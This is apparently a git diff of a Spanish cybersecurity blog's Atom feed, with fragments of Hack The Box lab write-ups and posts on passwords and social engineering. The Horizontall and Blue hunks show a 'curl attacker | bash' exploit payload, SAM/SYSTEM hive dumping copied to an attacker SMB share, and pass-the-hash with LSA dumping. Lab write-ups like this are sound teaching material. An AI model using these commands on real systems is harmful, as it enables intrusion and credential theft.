@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-02T11:28:23-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ewor01 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs, investigaciones, herramientas, charlas, etc.</subtitle><author><name>ewor01</name></author><entry><title type="html">¿Cómo crear una contraseña segura?</title><link href="http://localhost:4000/contrase%C3%B1as-seguras/" rel="alternate" type="text/html" title="¿Cómo crear una contraseña segura?" /><published>2023-02-13T00:00:00-06:00</published><updated>2023-02-13T00:00:00-06:00</updated><id>http://localhost:4000/contrase%C3%B1as-seguras</id><content type="html" xml:base="http://localhost:4000/contrase%C3%B1as-seguras/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-01-14T15:17:08-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ewor01 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs, investigaciones, herramientas, charlas, etc.</subtitle><author><name>ewor01</name></author><entry><title type="html">¿Cómo crear una contraseña segura?</title><link href="http://localhost:4000/contrase%C3%B1as-seguras/" rel="alternate" type="text/html" title="¿Cómo crear una contraseña segura?" /><published>2023-02-13T00:00:00-06:00</published><updated>2023-02-13T00:00:00-06:00</updated><id>http://localhost:4000/contrase%C3%B1as-seguras</id><content type="html" xml:base="http://localhost:4000/contrase%C3%B1as-seguras/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/contraseñas-seguras/contraseñas_seguras.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -76,7 +76,7 @@
 
 &lt;p&gt;Tambien podemos comprobar que tan seguras son nuestras contraseñas con la siguiente herramienta online proporcionada por Karspersky, la cual es muy sencilla de utilizar basta con ir a la web la cual te dejo por aquí &lt;a href=&quot;https://password.kaspersky.com/es/&quot;&gt;link&lt;/a&gt; solo colocas la contraseña a comprobar y obtendras el resultado de que tan seguras son tus contraseñas.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Con esto concluimos el post espero les sirva de ayuda y nos vemos en el siguiente, ayúdame compartiendo mi sitio con tus amigos, gracias.&lt;/strong&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="contraseñas seguras" /><summary type="html">¿Te gustaría aprender sobre Cómo crear contraseñas seguras y hacer un uso adecuado de estas?, vamos a ello.</summary></entry><entry><title type="html">Horizontall - Hack The Box</title><link href="http://localhost:4000/horizontall-hackthebox/" rel="alternate" type="text/html" title="Horizontall - Hack The Box" /><published>2023-02-05T00:00:00-06:00</published><updated>2023-02-05T00:00:00-06:00</updated><id>http://localhost:4000/horizontall-hackthebox</id><content type="html" xml:base="http://localhost:4000/horizontall-hackthebox/">&lt;p&gt;Certificaciones a aplicar: eJPT, eWPT&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Con esto concluimos el post espero les sirva de ayuda y nos vemos en el siguiente, ayúdame compartiendo mi sitio con tus amigos, gracias.&lt;/strong&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="password" /><category term="secure" /><category term="contraseñas seguras" /><summary type="html">¿Te gustaría aprender sobre Cómo crear contraseñas seguras y hacer un uso adecuado de estas?, vamos a ello.</summary></entry><entry><title type="html">Horizontall - Hack The Box</title><link href="http://localhost:4000/horizontall-hackthebox/" rel="alternate" type="text/html" title="Horizontall - Hack The Box" /><published>2023-02-05T00:00:00-06:00</published><updated>2023-02-05T00:00:00-06:00</updated><id>http://localhost:4000/horizontall-hackthebox</id><content type="html" xml:base="http://localhost:4000/horizontall-hackthebox/">&lt;p&gt;Certificaciones a aplicar: eJPT, eWPT&lt;/p&gt;
 
 &lt;p&gt;Dificultad: Fácil&lt;/p&gt;
 
@@ -173,7 +173,7 @@
 
 &lt;p&gt;Vamos a utilizar unas expresiones regulares con grep para filtrar por lo que nos interesa.&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://horizontall.htb/&quot;&lt;/span&gt; | htmlq &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; html | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;.*?&quot;'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;app&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://horizontall.htb/&quot;&lt;/span&gt; | htmlq &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; html | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;.*?&quot;&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;app&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-30-41.png&quot; alt=&quot;Hackforce-2022-12-11-23-30-41.png&quot; /&gt;&lt;/p&gt;
@@ -194,7 +194,7 @@
 
 &lt;p&gt;Vemos algo interesante así que vamos a crear una expresión regular una vez mas y que nos filtre por http.&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://horizontall.htb/js/app.c68eb462.js&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;.*?&quot;'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;http |  &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://horizontall.htb/js/app.c68eb462.js&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;.*?&quot;&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;http |  &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-42-50.png&quot; alt=&quot;Hackforce-2022-12-11-23-42-50.png&quot; /&gt;&lt;/p&gt;
@@ -496,7 +496,7 @@ ssty rows 37 columns 183
 
 &lt;p&gt;Y por ultimo ejecutamos el exploit.&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 &lt;span class=&quot;s1&quot;&gt;'curl 10.10.14.7 | bash'&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 &lt;span class=&quot;s1&quot;&gt;&apos;curl 10.10.14.7 | bash&apos;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-44-27.png&quot; alt=&quot;Hackforce-2022-12-12-03-44-27.png&quot; /&gt;&lt;/p&gt;
@@ -507,7 +507,7 @@ ssty rows 37 columns 183
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/root.png&quot; alt=&quot;Hackforce-2022-12-12-03-49-05.png&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Listo con esto tendríamos hecha la maquina por completo, happy hacking.&lt;/p&gt;</content><author><name>ewor01</name></author><category term="Information Leakage" /><category term="Port Forwarding" /><category term="Strapi CMS Exploitation" /><category term="Laravel Exploitation" /><summary type="html">Horizontall es una maquina donde estaremos explotando una vulnerabilidad en un gestor de contenido llamado Strapi, luego tendremos que hacer port forwarding para poder llegar a la maquina y posteriormente lograr comprometerla gracias a una vulnerabilidad en Laravel.</summary></entry><entry><title type="html">Jerry - Hack The Box</title><link href="http://localhost:4000/jerry-hackthebox/" rel="alternate" type="text/html" title="Jerry - Hack The Box" /><published>2023-01-29T00:00:00-06:00</published><updated>2023-01-29T00:00:00-06:00</updated><id>http://localhost:4000/jerry-hackthebox</id><content type="html" xml:base="http://localhost:4000/jerry-hackthebox/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Jerry.png&quot; alt=&quot;Jerry.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Listo con esto tendríamos hecha la maquina por completo, happy hacking.&lt;/p&gt;</content><author><name>ewor01</name></author><category term="hackthebox" /><category term="eJTP" /><category term="eWPT" /><category term="Fácil" /><category term="Linux" /><category term="Information Leakage" /><category term="Port Forwarding" /><category term="Strapi CMS Exploitation" /><category term="Laravel Exploitation" /><summary type="html">Horizontall es una maquina donde estaremos explotando una vulnerabilidad en un gestor de contenido llamado Strapi, luego tendremos que hacer port forwarding para poder llegar a la maquina y posteriormente lograr comprometerla gracias a una vulnerabilidad en Laravel.</summary></entry><entry><title type="html">Jerry - Hack The Box</title><link href="http://localhost:4000/jerry-hackthebox/" rel="alternate" type="text/html" title="Jerry - Hack The Box" /><published>2023-01-29T00:00:00-06:00</published><updated>2023-01-29T00:00:00-06:00</updated><id>http://localhost:4000/jerry-hackthebox</id><content type="html" xml:base="http://localhost:4000/jerry-hackthebox/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Jerry.png&quot; alt=&quot;Jerry.png&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Certificaciones a aplicar: eJPT&lt;/p&gt;
 
@@ -666,7 +666,7 @@ ssty rows 37 columns 183
 
 &lt;p&gt;Listo con esto tendríamos hecha la maquina por completo, happy hacking.&lt;/p&gt;
 
-&lt;p&gt;Les dejo la resolución de la misma por s4vitar &lt;a href=&quot;https://www.youtube.com/watch?v=bB-M5vPegMk&quot;&gt;Ver video&lt;/a&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="Information Leakage" /><category term="Tomcat" /><summary type="html">Jerry es una maquina donde estaremos explotando una vulnerabilidad en Tomcat, en el cual comprometeremos la maquina mediante un archivo war malicioso.</summary></entry><entry><title type="html">Ingeniería social y cómo protegerse</title><link href="http://localhost:4000/ingenier%C3%ADa-social/" rel="alternate" type="text/html" title="Ingeniería social y cómo protegerse" /><published>2023-01-16T00:00:00-06:00</published><updated>2023-01-16T00:00:00-06:00</updated><id>http://localhost:4000/ingenier%C3%ADa-social</id><content type="html" xml:base="http://localhost:4000/ingenier%C3%ADa-social/">&lt;p align=&quot;center&quot;&gt;
+&lt;p&gt;Les dejo la resolución de la misma por s4vitar &lt;a href=&quot;https://www.youtube.com/watch?v=bB-M5vPegMk&quot;&gt;Ver video&lt;/a&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="hackthebox" /><category term="eJTP" /><category term="Fácil" /><category term="Windows" /><category term="Information Leakage" /><category term="Tomcat" /><summary type="html">Jerry es una maquina donde estaremos explotando una vulnerabilidad en Tomcat, en el cual comprometeremos la maquina mediante un archivo war malicioso.</summary></entry><entry><title type="html">Ingeniería social y cómo protegerse</title><link href="http://localhost:4000/ingenier%C3%ADa-social/" rel="alternate" type="text/html" title="Ingeniería social y cómo protegerse" /><published>2023-01-16T00:00:00-06:00</published><updated>2023-01-16T00:00:00-06:00</updated><id>http://localhost:4000/ingenier%C3%ADa-social</id><content type="html" xml:base="http://localhost:4000/ingenier%C3%ADa-social/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/ingeniería-social/ingeniería-social2.jpg&quot; /&gt;
 &lt;/p&gt;
 
@@ -920,7 +920,7 @@ Creo que este es uno de los puntos más importantes, ya que al menos para mí ho
 &lt;img src=&quot;/assets/images/ingeniería-social/googlephish.jpg&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Con esto concluimos el post espero les sirva de ayuda y nos vemos en el siguiente, ayúdame compartiendo mi sitio con tus amigos, gracias.&lt;/strong&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="Ingeniería Social" /><summary type="html">¿Te gustaría aprender un poco sobre Ingeniería social?, pues toma un refresco y palomitas.</summary></entry><entry><title type="html">Blue - Hack The Box</title><link href="http://localhost:4000/blue-hackthebox/" rel="alternate" type="text/html" title="Blue - Hack The Box" /><published>2023-01-15T00:00:00-06:00</published><updated>2023-01-15T00:00:00-06:00</updated><id>http://localhost:4000/blue-hackthebox</id><content type="html" xml:base="http://localhost:4000/blue-hackthebox/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/Blue_htb.png&quot; alt=&quot;Blue_htb.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Con esto concluimos el post espero les sirva de ayuda y nos vemos en el siguiente, ayúdame compartiendo mi sitio con tus amigos, gracias.&lt;/strong&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="phishing" /><category term="smishing" /><category term="baiting" /><category term="Ingeniería Social" /><summary type="html">¿Te gustaría aprender un poco sobre Ingeniería social?, pues toma un refresco y palomitas.</summary></entry><entry><title type="html">Blue - Hack The Box</title><link href="http://localhost:4000/blue-hackthebox/" rel="alternate" type="text/html" title="Blue - Hack The Box" /><published>2023-01-15T00:00:00-06:00</published><updated>2023-01-15T00:00:00-06:00</updated><id>http://localhost:4000/blue-hackthebox</id><content type="html" xml:base="http://localhost:4000/blue-hackthebox/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/Blue_htb.png&quot; alt=&quot;Blue_htb.png&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Certificaciones a aplicar: OSCP&lt;/p&gt;
 
@@ -1036,7 +1036,7 @@ Creo que este es uno de los puntos más importantes, ya que al menos para mí ho
 
 &lt;p&gt;Una vez con acceso a la maquina verificamos que tipo de usuario somos&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/whoami.png&quot; alt=&quot;whoami.png&quot; /&gt;&lt;/p&gt;
@@ -1061,23 +1061,23 @@ Creo que este es uno de los puntos más importantes, ya que al menos para mí ho
 
 &lt;p&gt;Como extra nos dirigiremos al directorio Temp&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Windows\Temp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Windows\Temp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Nos crearemos un directorio llamado PostExploitation&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PostExploitation&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PostExploitation&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;luego entramos en ese directorio&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PostExploitation&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PostExploitation&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;El recurso sam y system normalmente están en uso por el sistema, el siguiente paso seria crear una copia de estos. Como poseemos máximos privilegios lo hacemos de la siguiente manera&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKLM\system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKLM\sam&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sam.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKLM\system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKLM\sam&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sam.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/sam_y_system.png&quot; alt=&quot;sam y system.png&quot; /&gt;&lt;/p&gt;
@@ -1091,8 +1091,8 @@ Creo que este es uno de los puntos más importantes, ya que al menos para mí ho
 
 &lt;p&gt;Para pasar los archivos utilizamos el siguiente comando en la maquina victima&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sam.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\10.10.14.9\smbFolder\sam&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\10.10.14.9\smbFolder\system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sam.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\10.10.14.9\smbFolder\sam&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\10.10.14.9\smbFolder\system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;En este caso lo copiaremos a nuestro equipo solo como sam y haremos lo mismo para system.&lt;/p&gt;
@@ -1114,14 +1114,14 @@ Creo que este es uno de los puntos más importantes, ya que al menos para mí ho
 
 &lt;p&gt;Con esto verificamos si el hash es correcto&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec cmb 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Administrator. -H '&lt;/span&gt;cdf51b162460b7d5bc898f493751a0cc&lt;span class=&quot;s1&quot;&gt;'
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec cmb 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Administrator. -H &apos;&lt;/span&gt;cdf51b162460b7d5bc898f493751a0cc&lt;span class=&quot;s1&quot;&gt;&apos;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;y nos pondrá Pwn3d! y con esto ya tendríamos como una persistencia y hacer cosas.&lt;/p&gt;
 
 &lt;p&gt;Por ejemplo dumpear lsa a ver si logramos ver algo en texto claro&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec cmb 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Administrator. -H '&lt;/span&gt;cdf51b162460b7d5bc898f493751a0cc&lt;span class=&quot;s1&quot;&gt;' --lsa
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec cmb 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Administrator. -H &apos;&lt;/span&gt;cdf51b162460b7d5bc898f493751a0cc&lt;span class=&quot;s1&quot;&gt;&apos; --lsa
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;No logramos ver nada interesante en texto claro entonces lo descartamos&lt;/p&gt;
@@ -1160,9 +1160,9 @@ payload_type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; EXE
 
 &lt;p&gt;Desde la maquina victima tomaremos las variables de entorno con los siguientes comandos&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;computername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
